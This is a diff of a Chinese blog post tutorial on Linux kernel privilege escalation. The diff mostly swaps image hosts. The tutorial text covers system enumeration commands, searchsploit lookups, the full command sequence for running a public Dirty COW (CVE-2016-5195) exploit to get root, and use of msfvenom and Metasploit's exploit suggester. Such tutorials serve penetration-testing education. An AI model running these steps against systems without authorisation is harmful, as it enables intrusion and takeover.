@@ -2,6 +2,7 @@
 title: "Linux内核提权"
 date: 2025-12-11T00:00:00+08:00
 draft: false
+
 ---
 
 # Linux内核提权
@@ -24,13 +25,13 @@ draft: false
 uname -a	# 查看系统全部信息
 ~~~
 
-![image-20240725161408117](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240725161409405-752791162.png)
+![image-20240725161408117](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725161409405-752791162.png)
 
 ~~~shell
 cat /etc/issue	# 查看Linux 系统的版本信息
 ~~~
 
-![image-20240725162645654](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240725162646942-1297550049.png)
+![image-20240725162645654](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725162646942-1297550049.png)
 
 不知道什么原因，这里文件中的占位符没有被解析，这些占位符的意思：
 
@@ -44,23 +45,24 @@ cat /etc/issue	# 查看Linux 系统的版本信息
 cat /etc/*-release	# 查看Linux 系统的详细版本信息
 ~~~
 
-![image-20240725162847897](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240725162848673-1081222333.png)
+![image-20240725162847897](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725162848673-1081222333.png)
 
 ~~~shell
 lsb_release -a	# 获取系统的详细信息，但系统不一定有lsb_release
 ~~~
 
-![image-20240725162917109](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240725162918156-1519238975.png)
+![image-20240725162917109](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725162918156-1519238975.png)
 
 ~~~shell
 cat /proc/version	# 查看 Linux 内核的版本信息及相关的编译信息
 ~~~
 
-![image-20240725162940901](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240725162941634-562397514.png)
+![image-20240725162940901](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725162941634-562397514.png)
 
 #### 查找exp
 
 使用kali自带的searchsploit即可查找exp，例如查找Ubantu 15.04的漏洞：
+
 ~~~shell
 searchsploit Ubantu 15.04
 ~~~
@@ -68,6 +70,7 @@ searchsploit Ubantu 15.04
 查到后，比如exp的path为`linux/local/37088.c`：
 
 * 查看exp：
+
   ~~~shell
   searchsploit -x linux/local/37088.c
   ~~~
@@ -131,22 +134,22 @@ linux内核的内存子系统在处理私有映射时的**写时复制（copy on
 
 主机版本：
 
-![image-20240726172050314](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240726172051641-1337059010.png)
+![image-20240726172050314](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240726172051641-1337059010.png)
 
 满足条件，开始漏洞利用，这里直接使用github上的exp：[gbonacini/CVE-2016-5195: A CVE-2016-5195 exploit example. (github.com)](https://github.com/gbonacini/CVE-2016-5195)
 
  ~~~shell
- # 首先下载exp，由于装了git，这里就直接clone了
- git clone https://github.com/gbonacini/CVE-2016-5195.git
- 
- # 进入目录make生成可执行文件
- make
- 
- # 执行make好的文件，即可自动完成利用并提权
- ./dcow -s
+# 首先下载exp，由于装了git，这里就直接clone了
+git clone https://github.com/gbonacini/CVE-2016-5195.git
+
+# 进入目录make生成可执行文件
+make
+
+# 执行make好的文件，即可自动完成利用并提权
+./dcow -s
  ~~~
 
-![image-20240726164601582](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240726164602670-1980545594.png)
+![image-20240726164601582](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240726164602670-1980545594.png)
 
 **注**：主机上需要有gcc，且执行make后的 gcc 版本要较高版本
 
@@ -162,11 +165,11 @@ linux内核的内存子系统在处理私有映射时的**写时复制（copy on
 
 * 首先getshell（我这里直接用msfvenom生成的马子上线）
 
-  ![image-20240727022254480](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240727022256072-972942248.png)
+  ![image-20240727022254480](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727022256072-972942248.png)
 
 * bg挂起会话，再use一下`post/multi/recon/local_exploit_suggester`模块，设置一下shell的session，即可自动检查：
 
-  ![image-20240727022830406](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240727022832204-2071525865.png)
+  ![image-20240727022830406](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727022832204-2071525865.png)
 
   发现有很多可能的漏洞，直接use填好参数即可利用
 
